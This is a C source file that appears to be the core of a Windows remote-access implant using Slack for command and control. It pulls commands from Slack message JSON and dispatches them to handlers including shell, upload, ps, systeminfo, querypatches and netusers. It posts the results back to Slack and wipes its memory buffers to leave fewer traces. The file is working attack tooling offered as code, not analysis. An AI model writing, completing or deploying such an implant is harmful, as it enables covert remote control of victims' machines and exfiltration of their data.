#include "Header.h"

BOOL Alert(const char* msg) {
    printf("[!] %s Failed With Error : %lu\n", msg, GetLastError());
    return FALSE;
}

void Base64Decode(const char* input, size_t inputLen, unsigned char** decodedCmd, size_t* outputLen) {
    if (!input || !decodedCmd || !outputLen) return;

    const char* base64_chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";

    unsigned char decoding_table[256] = { 0 };
    for (int i = 0; i < 64; i++)
        decoding_table[(unsigned char)base64_chars[i]] = i;

    // Adjust inputLen to exclude '=' padding
    while (inputLen > 0 && input[inputLen - 1] == '=') inputLen--;

    size_t paddedLen = strlen(input);
    size_t decodedLen = (paddedLen / 4) * 3;

    unsigned char* decoded = (unsigned char*)malloc(decodedLen);
    if (!decoded) {
        *decodedCmd = NULL;
        *outputLen = 0;
        return;
    }

    size_t i = 0, j = 0;
    unsigned char array4[4], array3[3];

    while (*input && *input != '=') {
        if (*input == '\r' || *input == '\n') {
            input++;
            continue;
        }

        array4[i++] = decoding_table[(unsigned char)(*input++)];

        if (i == 4) {
            array3[0] = (array4[0] << 2) | (array4[1] >> 4);
            array3[1] = ((array4[1] & 15) << 4) | (array4[2] >> 2);
            array3[2] = ((array4[2] & 3) << 6) | array4[3];

            for (i = 0; i < 3; i++)
                decoded[j++] = array3[i];

            i = 0;
        }
    }

    if (i > 0) {
        for (size_t k = i; k < 4; k++)
            array4[k] = 0;

        array3[0] = (array4[0] << 2) | (array4[1] >> 4);
        array3[1] = ((array4[1] & 15) << 4) | (array4[2] >> 2);
        array3[2] = ((array4[2] & 3) << 6) | array4[3];

        for (int k = 0; k < i - 1; k++)
            decoded[j++] = array3[k];
    }

    *decodedCmd = decoded;
    *outputLen = j;
}

void Base64Encode(const BYTE* input, size_t inputLen, char** output, size_t* outputLen) {
     const char* base64_chars =
         "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";

     // Calculate required length for output buffer
     size_t encodedLen = 4 * ((inputLen + 2) / 3);
     char* encoded = (char*)malloc(encodedLen + 1);  // +1 for null terminator
     if (!encoded) {
         *output = NULL;
         *outputLen = 0;
         return;
     }

     size_t i = 0, j = 0;
     unsigned char array3[3];
     unsigned char array4[4];

     while (inputLen--) {
         array3[i++] = *(input++);
         if (i == 3) {
             array4[0] = (array3[0] & 0xfc) >> 2;
             array4[1] = ((array3[0] & 0x03) << 4) + ((array3[1] & 0xf0) >> 4);
             array4[2] = ((array3[1] & 0x0f) << 2) + ((array3[2] & 0xc0) >> 6);
             array4[3] = array3[2] & 0x3f;

             for (i = 0; i < 4; i++)
                 encoded[j++] = base64_chars[array4[i]];
             i = 0;
         }
     }

     if (i > 0) {
         for (size_t k = i; k < 3; k++)
             array3[k] = '\0';

         array4[0] = (array3[0] & 0xfc) >> 2;
         array4[1] = ((array3[0] & 0x03) << 4) + ((array3[1] & 0xf0) >> 4);
         array4[2] = ((array3[1] & 0x0f) << 2) + ((array3[2] & 0xc0) >> 6);
         array4[3] = array3[2] & 0x3f;

         for (size_t k = 0; k < i + 1; k++)
             encoded[j++] = base64_chars[array4[k]];

         while (i++ < 3)
             encoded[j++] = '=';
     }

     encoded[j] = '\0';       // Null-terminate
     *output = encoded;       // Set output buffer
     *outputLen = j;          // Set output length (excluding null terminator)
 }

void Cleanup(SlackCmd** cmdArray, int* numElements, char** slackJson) {
    if (cmdArray && *cmdArray) {
        for (int i = 0; i < *numElements; i++) {
            if ((*cmdArray)[i].buffer && (*cmdArray)[i].bufferSize > 0) {
                SecureZeroMemory((*cmdArray)[i].buffer, (*cmdArray)[i].bufferSize);
                VirtualFree((*cmdArray)[i].buffer, 0, MEM_RELEASE);
                (*cmdArray)[i].buffer = NULL;
                (*cmdArray)[i].bufferSize = 0;
            }

            // Zero sensitive string fields as an extra precaution
            SecureZeroMemory((*cmdArray)[i].ts, sizeof((*cmdArray)[i].ts));
            SecureZeroMemory((*cmdArray)[i].name, sizeof((*cmdArray)[i].name));
            SecureZeroMemory((*cmdArray)[i].url_private, sizeof((*cmdArray)[i].url_private));
        }

        SecureZeroMemory(*cmdArray, sizeof(SlackCmd) * (*numElements));
        VirtualFree(*cmdArray, 0, MEM_RELEASE);
        *cmdArray = NULL;
    }

    if (slackJson && *slackJson) {
        SIZE_T len = strlen(*slackJson);
        SecureZeroMemory(*slackJson, len); // Only zero printable characters
        VirtualFree(*slackJson, 0, MEM_RELEASE);
        *slackJson = NULL;
    }

    *numElements = 0;
}

BOOL Dispatch(SlackCmd** cmdArray, int numElements) {
    
    // Validate Inputs
    if (!cmdArray || !*cmdArray || numElements <= 0) {
        printf("[!] Waiting for commands...\n");
        return FALSE;
    }

    // For each element in cmdArray, execute the command
    for (int i = numElements - 1; i >= 0; i--) {
        printf("[+] Dispatching cmdArray[%d]...\n", i);
        Execute(&(*cmdArray)[i]);
        SanitizeJSON(&(*cmdArray)[i]);
    }

    return TRUE;


}

void Execute(SlackCmd* slackCmd) {
    
    // Validate params
    if (!slackCmd || !slackCmd->buffer) {
        printf("[!] Invalid slackCmd or buffer in Execute\n");
        return;
    }

    // Get first element in array
    char* command = ParseCommand(slackCmd->buffer);

    if (strcmp(command, "ps") == 0) {
        ps(slackCmd);
    }
    else if (strcmp(command, "systeminfo") == 0) {
        systeminfo(slackCmd);
    }
    else if (strcmp(command, "querypatches") == 0) {
        querypatches(slackCmd);
    }
    else if (strcmp(command, "ls") == 0) {
        ls(slackCmd);
    }
    else if (strcmp(command, "cd") == 0) {
        cd(slackCmd);
    }
    else if (strcmp(command, "pwd") == 0) {
        pwd(slackCmd);
    }
    else if (strcmp(command, "username") == 0) {
        username(slackCmd);
    }
    else if (strcmp(command, "netusers") == 0) {
        netusers(slackCmd);
    }
    else if (strcmp(command, "upload") == 0) {
        upload(slackCmd);
    }
    else if (strcmp(command, "exit") == 0) {
        exit(0);
    }
    else if (strcmp(command, "shell") == 0) {
        shell(slackCmd);
    }
    else if (strcmp(command, "sha256") == 0) {
        sha256(slackCmd);
    }
    else {
        unknown(slackCmd);
    }
}

void FormatFileTime(const FILETIME* ft, char* outStr, size_t outStrSize) {
    SYSTEMTIME stUTC, stLocal;
    FileTimeToSystemTime(ft, &stUTC);
    SystemTimeToTzSpecificLocalTime(NULL, &stUTC, &stLocal);
    snprintf(outStr, outStrSize, "%04d-%02d-%02d %02d:%02d",
        stLocal.wYear, stLocal.wMonth, stLocal.wDay,
        stLocal.wHour, stLocal.wMinute);
}

void BufferReplace(char** buffer, int oldSize, int* newSize, char* format, ...) {

    // Validate pointers
    if (!buffer || !newSize || !format) {
        DEBUG("Invalid Params");
        return;
    }

    // Wipe the data
    if (*buffer) {
        SecureZeroMemory(*buffer, oldSize);
        VirtualFree(*buffer, 0, MEM_RELEASE);
        *buffer = NULL;
    }

    // Dynamically get the formatted data [..., "Current Directory: %s", gConfig.currentWorkingDir]
    va_list args;
    va_start(args, format);

    // Copy the va_list because vsnprintf will consume it
    va_list args_copy;
    va_copy(args_copy, args);
    *newSize = vsnprintf(NULL, 0, format, args_copy); // Adding a +1 here is bad, need to subtract if writing to a file
    va_end(args_copy);

    // Check the size of the buffer
    if (*newSize < 0) {
        DEBUG("vsnprintf");
        va_end(args);
        return;
    }

    // Allocate the memory
    *buffer = VirtualAlloc(NULL, *newSize + 1, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE); // Adding +1 here is better
    if (!*buffer) {
        DEBUG("VirtualAlloc");
        va_end(args);
        return;
    }

    // Assign the memory
    if (vsnprintf(*buffer, *newSize + 1, format, args) < 0) {
        DEBUG("vsnprintf");
    }

    va_end(args);

_ERROR:
    return;
}

void BufferReplaceRaw(char** buffer, int oldSize, int* newSize, const unsigned char* data, int dataSize) {
    // Validate input pointers
    if (!buffer || !newSize || !data) {
        DEBUG("Invalid Params");
        return;
    }

    // Free old buffer if any
    if (*buffer) {
        SecureZeroMemory(*buffer, oldSize);
        VirtualFree(*buffer, 0, MEM_RELEASE);
        *buffer = NULL;
    }

    *buffer = (char*)VirtualAlloc(NULL, dataSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!*buffer) {
        DEBUG("VirtualAlloc");
        return;
    }

    memcpy(*buffer, data, dataSize);
    *newSize = dataSize;

_ERROR:
    return;
}

void BufferAppend(char** buffer, int oldSize, int* newSize, const char* format, ...)
{
    if (!buffer || !newSize || !format) DEBUG("Invalid Params");

    va_list args;
    va_start(args, format);

    // Get length of formatted string excluding null terminator
    int formatSize = vsnprintf(NULL, 0, format, args);
    va_end(args);

    if (formatSize < 0) DEBUG("vsnprintf sizing");

    // New buffer size = oldSize + new formatted chars + 1 for single null terminator
    int totalSizeNeeded = oldSize + formatSize + 1;

    char* tmpBuffer = (char*)VirtualAlloc(NULL, totalSizeNeeded, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!tmpBuffer) DEBUG("VirtualAlloc");

    // Copy old data (excluding any null terminator)
    if (*buffer && oldSize > 0) {
        memcpy(tmpBuffer, *buffer, oldSize);
    }

    // Free old buffer
    if (*buffer) {
        SecureZeroMemory(*buffer, oldSize);
        VirtualFree(*buffer, 0, MEM_RELEASE);
    }

    // Write the formatted string WITHOUT the null terminator at the end
    // vsnprintf always null terminates, but we will ignore it by passing size = formatSize + 1 and then
    // NOT counting the null terminator in newSize, so no embedded nulls break our buffer.
    va_start(args, format);
    int written = vsnprintf(tmpBuffer + oldSize, formatSize + 1, format, args);
    va_end(args);

    if (written < 0 || written != formatSize) DEBUG("vsnprintf write");

    // Manually set one single null terminator at the end of the whole buffer
    tmpBuffer[totalSizeNeeded - 1] = '\0';

    // Update newSize to total chars appended (excluding null terminator)
    *newSize = oldSize + formatSize;

    *buffer = tmpBuffer;

_ERROR:
    return;
}

const char* GetFilename(const char* path) {
    const char* filename = strrchr(path, '\\'); // Windows path separator
    if (!filename) {
        filename = strrchr(path, '/'); // just in case on Unix
    }
    return filename ? filename + 1 : path;
}

char* ParseFirstArg(const char* input) {
    if (!input) return NULL;

    // Find first space to skip the command name
    const char* p = strchr(input, ' ');
    if (!p) return NULL;

    // Skip spaces after command
    while (*p == ' ') p++;
    if (*p == '\0') return NULL;

    const char* start = NULL;
    const char* end = NULL;

    if (*p == '"') {
        // Quoted argument
        p++; // skip opening quote
        start = p;
        end = p;

        while (*end) {
            if (*end == '"') {
                // Count backslashes before quote to detect if quote is escaped
                int backslashCount = 0;
                const char* q = end - 1;
                while (q >= start && *q == '\\') {
                    backslashCount++;
                    q--;
                }

                // Special case:
                // If exactly 1 backslash before quote AND quote is at end of string,
                // treat quote as closing quote (not escaped).
                if (backslashCount == 1 && *(end + 1) == '\0') {
                    // This handles trailing backslash before quote in Windows paths
                    break;
                }

                // If even number of backslashes, quote is not escaped
                if ((backslashCount % 2) == 0) {
                    break;
                }
            }
            end++;
        }

        if (*end != '"') {
            // Unterminated quote
            return NULL;
        }
    }
    else {
        // Unquoted argument
        start = p;
        end = p;
        while (*end && *end != ' ') end++;
    }

    size_t len = end - start;

    // Fix any escaped quotes or backslashes inside the argument
    // We'll copy into a new buffer, unescaping escaped quotes and backslashes
    char* arg = (char*)VirtualAlloc(NULL, len + 1, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!arg) return NULL;

    size_t j = 0;
    for (size_t i = 0; i < len; i++) {
        if (start[i] == '\\' && (i + 1 < len) && (start[i + 1] == '"' || start[i + 1] == '\\')) {
            // Skip the backslash and copy the escaped char
            i++;
            arg[j++] = start[i];
        }
        else {
            arg[j++] = start[i];
        }
    }
    arg[j] = '\0';

    return arg;
}

char* ParseSecondArg(const char* input) {
    if (!input) {
        printf("[!] input is NULL\n");
        return NULL;
    }

    printf("[*] input: %s\n", input);

    const char* p = input;

    // Step 1: Skip command
    while (*p && *p != ' ') p++;
    while (*p == ' ') p++;
    if (*p == '\0') {
        printf("[!] No first argument found\n");
        return NULL;
    }

    printf("[*] After skipping command, p points to: %s\n", p);

    // Step 2: Skip first argument (quoted or unquoted)
    if (*p == '"') {
        p++;  // skip opening quote
        printf("[*] Quoted arg detected. Scanning for closing quote...\n");
        while (*p) {
            if (*p == '"') {
                // Count backslashes before the quote
                int backslashes = 0;
                const char* b = p - 1;
                while (b >= input && *b == '\\') {
                    backslashes++;
                    b--;
                }
                if ((backslashes % 2) == 0) {
                    p++;  // skip closing quote
                    break;
                }
            }
            p++;
        }
    }
    else {
        while (*p && *p != ' ') p++;
    }

    printf("[*] After skipping first arg, p points to: %s\n", p);

    // Step 3: Skip spaces before second argument
    while (*p == ' ') p++;
    if (*p == '\0') {
        printf("[!] No second argument found\n");
        return NULL;
    }

    const char* start = p;
    while (*p && *p != ' ') p++;
    size_t len = p - start;

    printf("[*] Second arg starts at: '%s'\n", start);
    printf("[*] Second arg length: %zu\n", len);

    if (len == 0) {
        printf("[!] Second argument is empty\n");
        return NULL;
    }

    char* arg = (char*)VirtualAlloc(NULL, len + 1, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!arg) {
        printf("[!] VirtualAlloc failed\n");
        return NULL;
    }

    memcpy(arg, start, len);
    arg[len] = '\0';

    printf("[+] Extracted second argument: %s\n", arg);
    return arg;
}

char* ParseCommand(const char* input) {
    if (!input) return NULL;

    // Cap string size to prevent runaway reads
    size_t maxLen = 4096;
    size_t inputLen = strnlen_s(input, maxLen);
    if (inputLen == 0) return NULL;

    // Find the first space (or end of string if no space)
    const char* space = strchr(input, ' ');
    size_t cmdLen = space ? (size_t)(space - input) : inputLen;

    // Allocate buffer using VirtualAlloc
    size_t allocSize = (cmdLen + 1 + 0xFFF) & ~0xFFF; // round up to nearest 4KB
    char* command = (char*)VirtualAlloc(NULL, allocSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!command) return NULL;

    // Copy command safely
    if (strncpy_s(command, cmdLen + 1, input, cmdLen) != 0) {
        VirtualFree(command, 0, MEM_RELEASE);
        return NULL;
    }

    return command;
}

void SanitizeJSON(SlackCmd* slackCmd) {
    if (!slackCmd || !slackCmd->buffer || slackCmd->bufferSize <= 0) {
        return;
    }

    unsigned char* src = slackCmd->buffer;
    size_t srcLen = strlen((char*)src);

    // Allocate maximum possible size (every char becomes 6 bytes worst-case)
    size_t maxSanitizedSize = srcLen * 6 + 1;

    unsigned char* sanitized = (unsigned char*)VirtualAlloc(NULL, maxSanitizedSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!sanitized) return;

    size_t j = 0;
    for (size_t i = 0; i < srcLen; i++) {
        char c = src[i];
        switch (c) {
        case '\"': sanitized[j++] = '\\'; sanitized[j++] = '\"'; break;
        case '\\': sanitized[j++] = '\\'; sanitized[j++] = '\\'; break;
        case '\b': sanitized[j++] = '\\'; sanitized[j++] = 'b';  break;
        case '\f': sanitized[j++] = '\\'; sanitized[j++] = 'f';  break;
        case '\n': sanitized[j++] = '\\'; sanitized[j++] = 'n';  break;
        case '\r': sanitized[j++] = '\\'; sanitized[j++] = 'r';  break;
        case '\t': sanitized[j++] = '\\'; sanitized[j++] = 't';  break;
        default:
            sanitized[j++] = c;
            break;
        }
    }

    sanitized[j] = '\0';

    // Cleanup original buffer
    SecureZeroMemory(slackCmd->buffer, slackCmd->bufferSize);
    VirtualFree(slackCmd->buffer, 0, MEM_RELEASE);

    // Assign new sanitized buffer
    slackCmd->buffer = sanitized;
    slackCmd->bufferSize = (int)j;
}

BOOL ParseSlackJSON(char* slackJson, SlackCmd** cmdArray, int* numElements) {
    if (!slackJson || !cmdArray || !numElements) {
        printf("[+] Invalid args for ParseSlackJSON\n");
        return FALSE;
    }

    cJSON* root = cJSON_Parse(slackJson);
    if (!root) return FALSE;

    cJSON* messages = cJSON_GetObjectItem(root, "messages");
    if (!messages || !cJSON_IsArray(messages)) {
        cJSON_Delete(root);
        return FALSE;
    }

    int maxCount = gConfig.maxMsgToGet;
    *cmdArray = (SlackCmd*)VirtualAlloc(NULL, sizeof(SlackCmd) * maxCount, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!*cmdArray) {
        cJSON_Delete(root);
        return FALSE;
    }
    SecureZeroMemory(*cmdArray, sizeof(SlackCmd) * maxCount);

    int count = 0;
    cJSON* message = NULL;
    cJSON_ArrayForEach(message, messages) {
        if (count >= maxCount) break;

        if (cJSON_GetObjectItem(message, "thread_ts") != NULL)
            continue;

        cJSON* tsItem = cJSON_GetObjectItem(message, "ts");
        cJSON* textItem = cJSON_GetObjectItem(message, "text");

        if (!tsItem || !cJSON_IsString(tsItem) || !tsItem->valuestring) continue;
        if (!textItem || !cJSON_IsString(textItem) || !textItem->valuestring) continue;

        SlackCmd* cmd = &((*cmdArray)[count]);

        // ts
        strncpy_s(cmd->ts, sizeof(cmd->ts), tsItem->valuestring, _TRUNCATE);

        // Allocate and copy buffer
        size_t textLen = strlen(textItem->valuestring);
        size_t allocSize = textLen + 1;
        SYSTEM_INFO sysInfo;
        GetSystemInfo(&sysInfo);
        size_t pageSize = sysInfo.dwPageSize;
        size_t allocSizeRounded = ((allocSize + pageSize - 1) / pageSize) * pageSize;

        cmd->buffer = (unsigned char*)VirtualAlloc(NULL, allocSizeRounded, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        if (!cmd->buffer) break;

        memcpy(cmd->buffer, textItem->valuestring, textLen + 1);
        cmd->bufferSize = (int)textLen;

        // Try to extract file metadata if available
        cJSON* filesArray = cJSON_GetObjectItem(message, "files");
        if (filesArray && cJSON_IsArray(filesArray)) {
            cJSON* fileObj = cJSON_GetArrayItem(filesArray, 0);  // Only grabbing first file
            if (fileObj) {
                cJSON* nameItem = cJSON_GetObjectItem(fileObj, "name");
                cJSON* urlItem = cJSON_GetObjectItem(fileObj, "url_private");

                if (nameItem && cJSON_IsString(nameItem) && nameItem->valuestring) {
                    strncpy_s(cmd->name, sizeof(cmd->name), nameItem->valuestring, _TRUNCATE);
                }

                if (urlItem && cJSON_IsString(urlItem) && urlItem->valuestring) {
                    strncpy_s(cmd->url_private, sizeof(cmd->url_private), urlItem->valuestring, _TRUNCATE);
                }
            }
        }

        count++;
    }

    *numElements = count;
    cJSON_Delete(root);
    return TRUE;
}

void Transmit(SlackCmd* cmdArray, int numElements) {
    for (int i = numElements - 1; i >= 0; --i) {
        printf("[i] Preparing for transmit slackCmd[%d]\n", i);
        if(!PostToSlack(&cmdArray[i])) 
            printf("[!] Failed to post message %d to Slack.\n", i);
    }
}

char* WideStringToUTF8(PWSTR wideStr, USHORT lengthInBytes) {
    if (!wideStr || lengthInBytes == 0) {
        // Return empty string safely
        char* emptyStr = (char*)malloc(1);
        if (emptyStr) emptyStr[0] = '\0';
        return emptyStr;
    }

    // Calculate number of WCHAR characters (UTF-16 units)
    int wideCharCount = lengthInBytes / sizeof(WCHAR);

    // Allocate temp buffer with null terminator
    PWSTR tempWide = (PWSTR)malloc((wideCharCount + 1) * sizeof(WCHAR));
    if (!tempWide) return NULL;

    // Copy exactly lengthInBytes bytes into tempWide
    memcpy(tempWide, wideStr, lengthInBytes);

    // Null terminate for WideCharToMultiByte safety
    tempWide[wideCharCount] = L'\0';

    // Get required UTF-8 buffer size (including null terminator)
    int utf8Size = WideCharToMultiByte(CP_UTF8, 0, tempWide, -1, NULL, 0, NULL, NULL);
    if (utf8Size == 0) {
        free(tempWide);
        return NULL;
    }

    // Allocate UTF-8 buffer
    char* utf8Str = (char*)malloc(utf8Size);
    if (!utf8Str) {
        free(tempWide);
        return NULL;
    }

    // Convert wide string to UTF-8 string
    int result = WideCharToMultiByte(CP_UTF8, 0, tempWide, -1, utf8Str, utf8Size, NULL, NULL);

    free(tempWide);

    if (result == 0) {
        free(utf8Str);
        return NULL;
    }

    // utf8Str is null-terminated UTF-8 string
    return utf8Str;
}

